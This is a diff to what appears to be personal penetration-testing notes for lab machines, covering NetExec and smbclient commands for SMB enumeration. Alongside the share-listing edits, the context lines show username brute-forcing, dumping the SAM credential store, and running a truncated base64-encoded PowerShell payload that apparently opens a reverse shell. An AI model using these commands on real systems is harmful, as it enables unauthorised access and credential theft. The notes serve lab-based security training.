@@ -168,12 +168,13 @@ dig axfr hutch.offsec @192.168.223.122
 NXC
 nxc smb [ip]
 nxc smb 10.10.11.35 -u userlist.txt -p 'password' [bruteforce usernames, change smb to winrm/ldap or any other protocol you want to test perms for]
-nxc smb [host/ip] -u guest -p '' --shares [list shares depending on user access provided]
+nxc smb $ip -u guest -p '' --shares [list shares depending on user access provided]
 nxc smb [host] -u [user] -p [password] --sam
 nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
 
 SMBCLIENT [INTERACT WITH SMB]
 smbclient //[ip]/[share] -N -L [List share with null auth]
+smbclient -L //[ip] -U [user]
 smbclient --user username //10.10.11.35/DEV
 recurse ON
 prompt OFF
